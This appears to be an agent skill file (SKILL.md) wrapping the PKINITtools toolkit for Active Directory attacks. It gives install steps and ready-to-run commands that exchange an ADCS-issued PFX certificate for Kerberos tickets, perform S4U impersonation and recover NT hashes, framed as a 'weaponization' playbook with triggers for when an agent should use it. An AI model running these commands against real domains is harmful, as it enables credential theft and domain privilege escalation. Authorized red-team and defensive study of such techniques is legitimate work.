---
name: pkinittools-adcs
description: "Weaponize ADCS PFX. Signals: AD attack, domain penetration, PFX ticket exchange, S4U, NT hash recovery."
zh-signals: "PKINITtools: ADCS PFX 武器化。信号:ad攻击,域渗透,PFX 换票据,S4U,NT 哈希恢复。"
when-to-use: >-
  Use when you hold an ADCS-issued PFX certificate and want to exchange it for
  Kerberos tickets, perform S4U, or recover the NT hash during domain privilege escalation.
---

# PKINITtools

- Attack Category: C30 AD Domain Penetration and Domain Controller Attacks
- Upstream Repository: https://github.com/dirkjanm/PKINITtools
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/dirkjanm/PKINITtools && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 gettgtpkinit.py -cert-pfx user.pfx corp.local/user user.ccache` | PFX ticket exchange |
| `python3 gets4uticket.py -ccache user.ccache corp.local/user cifs/dc01` | S4U |
| `python3 getnthash.py -key 0x... corp.local/user` | NT hash recovery |

## Attack Scenario Playbook

### ADCS PFX Weaponization

```bash
python3 gettgtpkinit.py -cert-pfx user.pfx corp.local/user out.ccache
# certipy pfx→ccache→NT hash, by dirkjanm
```

## Notes

By dirkjanm, an ADCS certificate + PKINIT attack chain toolkit.